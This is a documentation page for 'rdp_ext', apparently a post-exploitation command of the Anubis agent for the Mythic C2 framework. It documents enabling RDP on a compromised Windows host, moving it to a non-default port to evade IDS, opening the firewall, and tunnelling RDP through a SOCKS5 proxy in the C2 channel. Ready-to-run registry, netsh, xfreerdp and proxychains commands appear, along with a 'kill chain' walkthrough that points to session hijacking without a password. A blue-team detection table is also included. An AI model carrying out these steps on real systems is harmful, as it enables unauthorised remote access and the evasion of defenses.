+++
title = "rdp_ext"
chapter = false
weight = 140
hidden = false
+++

## Summary

Configures RDP on the **agent's own host** and provides ready-to-run connection commands via the Anubis SOCKS5 tunnel. Designed for scenarios where the agent is the RDP target: changes the RDP port to 6000, opens the Windows Firewall, restarts TermService, and returns xfreerdp/rdesktop commands.

- **Platform**: Windows only (registry + SCM + firewall require Windows)
- **MITRE ATT&CK**: T1021.001, T1090, T1562.004
- **Version**: 2.0
- **Author**: @wtechsec

### Arguments

#### target *(optional)*
- IP or hostname to probe and put in connection commands. Empty = agent auto-detects its own local IP.

#### port *(optional, default: 6000)*
- RDP port to configure in the registry. Avoids default 3389 (common IDS rule).

#### username *(optional)*
- RDP username for the generated connection commands.

#### password *(optional)*
- RDP password.

#### domain *(optional)*
- Windows domain (e.g., `CORP`).

#### socks_port *(optional, default: 7005)*
- Port to open on the Mythic server for SOCKS5.

## How It Works

```
┌──────────────────────────────────────────────────────────┐
│  Agent host (Windows — 192.168.1.10)                     │
│                                                          │
│  1. registry: fDenyTSConnections = 0  (enable RDP)      │
│  2. registry: RDP-Tcp\PortNumber    = 6000               │
│  3. netsh:    add rule TCP/6000 inbound                  │
│  4. SCM:      SessionEnv+TermService stop→start (ctypes)  │
│  5. socket:   probe 192.168.1.10:6000 → REACHABLE        │
└──────────────────────────────────────────────────────────┘
            ↕ C2 channel (HTTP/TLS)
┌──────────────────────────────────────────────────────────┐
│  Mythic server — SOCKS5 :7005                            │
└──────────────────────────────────────────────────────────┘
            ↕ xfreerdp /proxy:socks5://127.0.0.1:7005
┌──────────────────────────────────────────────────────────┐
│  Operator (Kali)                                         │
│  xfreerdp /proxy:socks5://127.0.0.1:7005                 │
│           /v:192.168.1.10:6000 /u:Administrator ...       │
└──────────────────────────────────────────────────────────┘
```

## Usage

```
# Sem credenciais — usa IP local do agente
rdp_ext

# Com IP e credenciais
rdp_ext 192.168.1.10 Administrator P@ssw0rd CORP

# JSON (porta customizada)
rdp_ext {"target":"192.168.1.10","port":6000,"username":"jsmith","domain":"CORP","password":"P@ssw0rd"}
```

## Output Example

```
[+] RDP habilitado (fDenyTSConnections = 0)
[+] Porta RDP: 3389 → 6000 (registro atualizado)
[+] Firewall: regra inbound TCP/6000 adicionada (AnubisRDP-6000)
[+] TermService reiniciado e ativo na porta 6000

[+] TCP 192.168.1.10:6000 — REACHABLE
[+] SOCKS5 iniciado na porta 7005 do servidor Mythic

╔══ PROXYCHAINS CONFIG ═════════════════════════════════════════╗
║  [ProxyList]
║  socks5  127.0.0.1  7005
╚═══════════════════════════════════════════════════════════════╝

── rdesktop ──────────────────────────────────────────────────────
  proxychains rdesktop 192.168.1.10 -P 6000 -d 'CORP' -u 'Administrator' -p 'P@ssw0rd' -g 1920x1080 -K

── xfreerdp (proxychains) ────────────────────────────────────────
  proxychains xfreerdp /v:192.168.1.10:6000 /u:Administrator /d:CORP /p:'P@ssw0rd' /cert-ignore +clipboard /dynamic-resolution

── xfreerdp (SOCKS5 nativo) ──────────────────────────────────────
  xfreerdp /proxy:socks5://127.0.0.1:7005 /v:192.168.1.10:6000 /u:Administrator /d:CORP /p:'P@ssw0rd' /cert-ignore +clipboard /dynamic-resolution

[*] Usuário : CORP\Administrator
[*] Alvo    : 192.168.1.10:6000
```

## What It Configures

### Registry Changes

| Key | Value | Before | After |
|---|---|---|---|
| `HKLM\...\Terminal Server` | `fDenyTSConnections` | 1 (disabled) | 0 (enabled) |
| `HKLM\...\RDP-Tcp` | `PortNumber` | 3389 | 6000 |

### Firewall Rule

```
netsh advfirewall firewall add rule
  name=AnubisRDP-6000
  dir=in
  action=allow
  protocol=TCP
  localport=6000
```

The rule is deleted and re-added on each run (idempotent).

### Service Restart (ctypes — no sc.exe)

```
OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT)

# 1. Stop SessionEnv (Remote Desktop Configuration — manages RDP-Tcp listener)
OpenServiceW(hSCM, "SessionEnv", ...) → ControlService(STOP) → poll STOPPED

# 2. Stop TermService
OpenServiceW(hSCM, "TermService", ...) → ControlService(STOP) → poll STOPPED

# 3. Start TermService
StartServiceW(...) → poll RUNNING

# 4. Start SessionEnv — re-reads PortNumber from registry at init → binds RDP-Tcp to new port
StartServiceW(...) → poll RUNNING
```

Restarting only `TermService` is insufficient — the actual RDP listener (`RDP-Tcp`) is owned by `SessionEnv`, which must be restarted to apply the port change from the registry.

## Prerequisites (Operator — Kali)

```bash
# xfreerdp — recommended (native SOCKS5 proxy support)
sudo apt install freerdp2-x11

# rdesktop — alternative
sudo apt install rdesktop

# proxychains — only needed if not using xfreerdp native proxy
sudo apt install proxychains-ng
```

## MITRE ATT&CK

- **T1021.001** — Remote Services: Remote Desktop Protocol
- **T1090** — Proxy (SOCKS5 via C2 channel)
- **T1562.004** — Impair Defenses: Disable or Modify System Firewall

## Detection (Blue Team)

| Event | Source | Description |
|---|---|---|
| Security EID **4946** | Agent host | "A rule was added to the Windows Firewall exception list" |
| System EID **7036** | Agent host | "TermService service entered the stopped/running state" |
| Security EID **4657** | Agent host | Registry value modified (if object access auditing enabled) |
| Security EID **4624** | Agent host | Logon Type 10 (RemoteInteractive) when operator connects |
| Security EID **4625** | Agent host | Failed logon (if wrong credentials used) |

**Network:** RDP traffic is tunneled inside the existing C2 HTTP/TLS stream — not visible as raw RDP to network sensors monitoring for port 3389 or 6000.

## Notes

- **TermService restart disconnects active RDP sessions** — if another user is connected, they will be disconnected. Run during off-hours or confirmed-idle windows.
- **Port 6000** avoids default IDS rules targeting 3389; change with `port` parameter if needed.
- **Auto IP detection**: if `target` is empty, the agent calls `socket.gethostbyname(socket.gethostname())` — on multi-homed hosts, verify this returns the correct interface IP.
- **Cleanup**: use `socks stop 7005` after the session. The firewall rule (`AnubisRDP-6000`) and port change persist — restore manually or via another `eval_code` task if needed.

### Full Kill Chain

```
# HOST-A comprometido, Anubis ativo
# Objetivo: RDP para HOST-B (192.168.1.10, Win11)

# Fase 1 — Anubis rodando no HOST-B como SYSTEM:
rdp_ext 192.168.1.10 Administrator P@ssw0rd CORP
# → configura porta 6000, firewall, reinicia TermService
# → retorna xfreerdp /proxy:socks5://127.0.0.1:7005 /v:192.168.1.10:6000 ...

# Fase 2 — no Kali do operador:
xfreerdp /proxy:socks5://127.0.0.1:7005 \
  /v:192.168.1.10:6000 \
  /u:Administrator /d:CORP /p:'P@ssw0rd' \
  /cert-ignore +clipboard /dynamic-resolution

# Alternativa — se sessão RDP desconectada (sem credenciais):
# 1. rdp_ext (configura porta/firewall)
# 2. rdp_hijack 3 (hijacka sessão desconectada → acesso sem senha)
```

---

## Resumo em Português (PT-BR)

Configura RDP no host do agente e retorna comandos de conexão via tunnel SOCKS5 do Anubis. Realiza três ações no host Windows:

1. **Registro**: habilita RDP (`fDenyTSConnections=0`) e muda porta para 6000
2. **Firewall**: adiciona regra inbound TCP/6000 via `netsh`
3. **Serviço**: reinicia `TermService` via ctypes SCM (sem sc.exe)

Após a configuração, faz probe TCP e retorna comandos prontos para `rdesktop` e `xfreerdp`. O xfreerdp com `/proxy:socks5://` é o método preferido — não requer proxychains.
